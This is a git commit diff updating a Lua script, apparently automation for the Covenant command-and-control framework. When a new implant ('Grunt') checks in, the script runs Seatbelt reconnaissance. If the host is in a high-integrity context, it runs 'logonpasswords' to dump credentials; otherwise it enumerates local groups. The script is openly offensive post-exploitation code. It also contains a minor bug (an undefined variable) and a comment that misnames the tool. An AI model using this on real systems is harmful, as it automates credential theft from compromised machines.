fcc75fe07452cb2a1513ddc8a94df423bb71e5e4
checkymander <checkymander@protonmail.com>
2019-10-29 19:27:50 -0400

    Updated forerunner.lua to better reflect current changes

--- Forerunner/Forerunner.lua
+++ Forerunner/Forerunner.lua
@@ -1,13 +1,23 @@
-function OnCommandOutput(gruntName, command, commandOutput)
-	print('New Task Output from: ' .. gruntName)
-	print('Command: ' .. command)
-	print('Output: ' .. commandOutput)
+function OnGruntInitial(n)
+	--Forerunner passes the Grunt object to the script and can be accessed like so:
+	print ('New Grunt Received with ID: ' .. gruntName)
+	
+	--Run Seatbelt
+	response = GruntExec(n,'SeatBelt system')
+	
+	--Check Seatbelt to determine if Grunt is in High Integrity Context
+	print('[LUA] Checking Seatbelt Output:')
+	if string.match(response, "HighIntegrity                 :  True") then
+		print ('Returned Grunt is High Integrity.')
+		print ('Tasking Rubeus to Grunt.')
+		response = (GruntExec(n,'logonpasswords'))
+		print (response)
+	else
+		print ('Returned Grunt is Medium Integrity')
+		print (GruntExec(n,'shellcmd net localgroup'))
+	end	
 end
 
-function OnGruntInitial(n,a,u)
-	print ('[LUA] Getting Grunts')
-	GetGrunts()
-	print ('[LUA] New Grunt Received: ' .. n)
-	print ('[LUA] Sending Command ProcessList command')
-	print (Exec(n,'SeatBelt system'))
+function OnGlobalOutput()
+	print('Global Output')
 end
